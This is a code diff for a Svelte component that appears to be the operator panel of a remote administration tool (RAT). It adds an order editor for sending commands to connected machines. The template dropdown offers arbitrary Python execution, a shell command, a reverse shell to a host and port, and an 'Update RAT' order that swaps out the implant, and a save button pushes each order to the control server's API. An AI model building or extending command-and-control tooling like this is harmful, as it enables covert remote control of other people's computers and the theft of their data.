@@ -10,6 +10,9 @@
     machines: Record<string, MachineType>
   } = $props();
 
+  let code = $state(JSON.stringify(order.data, null, "\t"));
+  let saved = $state(true);
+
   async function send_to_selected(force=false) {
     for (const [machine_id, selected] of Object.entries(selected_machines)) {
       if (selected) {
@@ -65,7 +68,32 @@
       {/each}
     </div>
 
-    <textarea>Code</textarea>
+    <br>
+
+    <label for="templates">Choose a template:</label>
+    <select name="templates" id="templates" bind:value={code} onchange={() => {saved = false;}}>
+      <option value={JSON.stringify({type:"python", code:"print('Hello world')"}, null, "\t")}>Python code</option>
+      <option value={JSON.stringify({type:"run", code:"gnome-calculator -m advanced"}, null, "\t")}>Run command</option>
+      <option value={JSON.stringify({type:"shell", host:"127.0.0.1", port:1234}, null, "\t")}>Reverse shell</option>
+      <option value={JSON.stringify({type:"update", code:"REPLACE THE RAT FILE WITH THIS (DANGEROUS!!)"}, null, "\t")}>Update RAT</option>
+    </select>
+    <button onclick={async () => {
+      try {
+        order.data = JSON.parse(code);
+        saved = true;
+        await fetch(server_config.url + "api/orders/" + order.id, {
+          method: "PATCH",
+          headers: get_auth_header({
+            "Content-Type": "application/json"
+          }),
+          body: JSON.stringify({data: order.data}),
+        })
+      } catch (e) {
+        alert(e);
+      }
+    }}>Save code</button>
+    <br>
+    <textarea placeholder="Order JSON" bind:value={code} oninput={() => {saved = false;}} class={saved ? "saved" : "unsaved"}></textarea>
 </details>
 <br>
 
@@ -92,5 +120,9 @@
 
   .inactive {
     color: lightcoral;
+  }
+
+  .unsaved {
+    color: darkred;
   }
 </style>
